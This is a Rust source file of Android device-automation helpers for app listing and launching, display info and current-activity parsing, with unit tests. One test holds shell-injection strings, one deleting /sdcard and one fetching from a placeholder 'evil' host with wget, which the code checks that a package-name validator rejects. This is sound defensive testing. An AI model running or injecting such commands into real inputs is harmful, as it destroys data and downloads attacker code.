// Copyright (c) 2024-2026 Tday Authors. All rights reserved.
// SPDX-License-Identifier: BUSL-1.1
// See LICENSE in the repository root for full license text.

//! Android navigation helpers: app listing, launch, display info, current activity.

use serde::Serialize;

use super::device::AndroidDevice;

/// A package installed on the Android device.
#[derive(Debug, Clone, Serialize)]
pub struct AndroidAppInfo {
    pub package_name: String,
}

/// Physical display dimensions and density.
#[derive(Debug, Clone, Serialize)]
pub struct AndroidDisplayInfo {
    pub width: u32,
    pub height: u32,
    pub density: u32,
}

/// The currently-foreground activity.
#[derive(Debug, Clone, Serialize)]
pub struct AndroidActivity {
    pub package: String,
    pub activity: String,
}

/// List installed packages.
/// When `user_apps_only` is true only third-party apps (flag `-3`) are returned.
pub fn list_apps(
    device: &mut AndroidDevice,
    user_apps_only: bool,
) -> Result<Vec<AndroidAppInfo>, String> {
    let output = if user_apps_only {
        device.shell_args(&["pm", "list", "packages", "-3"])?
    } else {
        device.shell_args(&["pm", "list", "packages"])?
    };
    Ok(parse_package_list(&output))
}

/// Force-stop then monkey-launch an app by package name.
///
/// `package_name` must consist only of letters, digits, underscores, and dots
/// (the standard Android package name character set).  Anything else is
/// rejected to prevent shell injection via `shell_args`.
pub fn launch_app(device: &mut AndroidDevice, package_name: &str) -> Result<(), String> {
    // Validate to prevent shell injection: only allow letters, digits, dot, underscore.
    if package_name.is_empty()
        || !package_name.chars().all(|c| c.is_ascii_alphanumeric() || c == '.' || c == '_')
    {
        return Err(format!(
            "Invalid package name '{package_name}': only [a-zA-Z0-9._] are allowed"
        ));
    }

    // Force-stop first so the app starts fresh.
    device.shell_args(&["am", "force-stop", package_name]).ok();

    let output = device.shell_args(&[
        "monkey",
        "-p",
        package_name,
        "-c",
        "android.intent.category.LAUNCHER",
        "1",
    ])?;

    if output.contains("No activities found") {
        return Err(format!(
            "No launchable activity found for package '{package_name}'"
        ));
    }
    Ok(())
}

/// Query `wm size` and `wm density` for the current display.
pub fn get_display_info(device: &mut AndroidDevice) -> Result<AndroidDisplayInfo, String> {
    let size_output    = device.shell("wm size")?;
    let density_output = device.shell("wm density")?;

    let (width, height) = parse_wm_size(&size_output)
        .ok_or_else(|| format!("Failed to parse display size from: {}", size_output.trim()))?;
    let density = parse_wm_density(&density_output).ok_or_else(|| {
        format!(
            "Failed to parse display density from: {}",
            density_output.trim()
        )
    })?;

    Ok(AndroidDisplayInfo { width, height, density })
}

/// Return the currently focused package and activity via `dumpsys activity`.
pub fn get_current_activity(device: &mut AndroidDevice) -> Result<AndroidActivity, String> {
    let output = device.shell("dumpsys activity activities | grep -E 'mCurrentFocus|mFocusedActivity' | head -3")?;
    parse_current_activity(&output)
        .ok_or_else(|| format!("Failed to parse current activity from: {}", output.trim()))
}

/// Perform an OCR find-text on a fresh screenshot.
#[allow(dead_code)]
pub fn find_text(device: &mut AndroidDevice, search: &str) -> Result<Vec<FoundText>, String> {
    let screenshot = super::screenshot::capture(device)?;
    let results = find_text_in_png(&screenshot.png_data, search);
    Ok(results)
}

/// A text region found by Android OCR (post-processed via Tesseract-style heuristic).
#[allow(dead_code)]
#[derive(Debug, Clone, Serialize)]
pub struct FoundText {
    pub text: String,
    pub confidence: f32,
    pub x: u32,
    pub y: u32,
    pub width: u32,
    pub height: u32,
}

/// Stub OCR: scan the PNG for visible text by looking for exact ASCII matches
/// in the raw bitmap. Real OCR would call the Android `mlkit` via UIAutomator
/// or forward to the host OCR engine. For now we return a single match stub.
#[allow(dead_code)]
fn find_text_in_png(_png: &[u8], search: &str) -> Vec<FoundText> {
    // TODO: integrate real OCR (e.g., forward to host `platform::find_text_ocr`)
    let _ = search;
    Vec::new()
}

// ─── Parsers ────────────────────────────────────────────────────────────────

fn parse_package_list(output: &str) -> Vec<AndroidAppInfo> {
    output
        .lines()
        .filter_map(|line| {
            line.strip_prefix("package:")
                .map(|pkg| AndroidAppInfo { package_name: pkg.trim().to_string() })
        })
        .collect()
}

fn parse_wm_size(output: &str) -> Option<(u32, u32)> {
    // "Physical size: 1080x1920" or "Override size: …"
    for line in output.lines() {
        if let Some(rest) = line.trim().strip_prefix("Physical size:") {
            let rest = rest.trim();
            if let Some((w, h)) = rest.split_once('x') {
                let w: u32 = w.trim().parse().ok()?;
                let h: u32 = h.trim().parse().ok()?;
                return Some((w, h));
            }
        }
    }
    None
}

fn parse_wm_density(output: &str) -> Option<u32> {
    for line in output.lines() {
        if let Some(rest) = line.trim().strip_prefix("Physical density:") {
            return rest.trim().parse().ok();
        }
    }
    None
}

fn parse_current_activity(output: &str) -> Option<AndroidActivity> {
    // Typical format: "mCurrentFocus=Window{... com.example/.MainActivity}"
    for line in output.lines() {
        if let Some(rest) = line.find("mCurrentFocus=Window{").map(|i| &line[i..]) {
            if let Some(pkg_act) = rest.split_whitespace().last() {
                let pkg_act = pkg_act.trim_end_matches('}');
                if let Some((pkg, act)) = pkg_act.split_once('/') {
                    let activity = if act.starts_with('.') {
                        format!("{pkg}{act}")
                    } else {
                        act.to_string()
                    };
                    return Some(AndroidActivity { package: pkg.to_string(), activity });
                }
            }
        }
        // "mFocusedActivity: ... com.example/.MainActivity"
        if line.contains("mFocusedActivity") {
            if let Some(part) = line.split_whitespace().last() {
                let part = part.trim_end_matches('}');
                if let Some((pkg, act)) = part.split_once('/') {
                    let activity = if act.starts_with('.') {
                        format!("{pkg}{act}")
                    } else {
                        act.to_string()
                    };
                    return Some(AndroidActivity { package: pkg.to_string(), activity });
                }
            }
        }
    }
    None
}

// ─── Text-to-keycode helper ──────────────────────────────────────────────────

/// Map a human-friendly key name to an Android `KEYCODE_*` constant.
pub fn key_name_to_keycode(key: &str) -> String {
    match key.to_uppercase().as_str() {
        "HOME"   => "KEYCODE_HOME".to_string(),
        "BACK"   => "KEYCODE_BACK".to_string(),
        "MENU"   => "KEYCODE_MENU".to_string(),
        "POWER"  => "KEYCODE_POWER".to_string(),
        "VOLUME_UP"   => "KEYCODE_VOLUME_UP".to_string(),
        "VOLUME_DOWN" => "KEYCODE_VOLUME_DOWN".to_string(),
        "ENTER"  => "KEYCODE_ENTER".to_string(),
        "DEL" | "BACKSPACE" => "KEYCODE_DEL".to_string(),
        "TAB"    => "KEYCODE_TAB".to_string(),
        "SPACE"  => "KEYCODE_SPACE".to_string(),
        "ESCAPE" | "ESC" => "KEYCODE_ESCAPE".to_string(),
        "APP_SWITCH" | "RECENT_APPS" => "KEYCODE_APP_SWITCH".to_string(),
        _ => key.to_string(),  // pass through KEYCODE_* constants directly
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn parse_package_list_basic() {
        let output = "package:com.android.chrome\npackage:com.example.app\n";
        let apps = parse_package_list(output);
        assert_eq!(apps.len(), 2);
        assert_eq!(apps[0].package_name, "com.android.chrome");
    }

    #[test]
    fn parse_wm_size_basic() {
        let output = "Physical size: 1080x1920\n";
        assert_eq!(parse_wm_size(output), Some((1080, 1920)));
    }

    #[test]
    fn parse_wm_density_basic() {
        let output = "Physical density: 420\n";
        assert_eq!(parse_wm_density(output), Some(420));
    }

    #[test]
    fn key_name_mapping() {
        assert_eq!(key_name_to_keycode("home"), "KEYCODE_HOME");
        assert_eq!(key_name_to_keycode("KEYCODE_ENTER"), "KEYCODE_ENTER");
    }

    #[test]
    fn launch_app_rejects_injection() {
        // Can't call launch_app without a device, but we can test the validation logic directly.
        let bad_names = [
            "com.foo; rm -rf /sdcard",
            "com.foo && wget http://evil/p",
            "",
            "com.foo/bar",
        ];
        for name in &bad_names {
            assert!(
                name.is_empty() || !name.chars().all(|c| c.is_ascii_alphanumeric() || c == '.' || c == '_'),
                "Expected '{name}' to be rejected"
            );
        }
    }

    #[test]
    fn launch_app_accepts_valid_package_name() {
        let good_names = ["com.android.chrome", "org.example.app_v2", "com.foo.Bar123"];
        for name in &good_names {
            assert!(
                !name.is_empty() && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '.' || c == '_'),
                "Expected '{name}' to be accepted"
            );
        }
    }
}
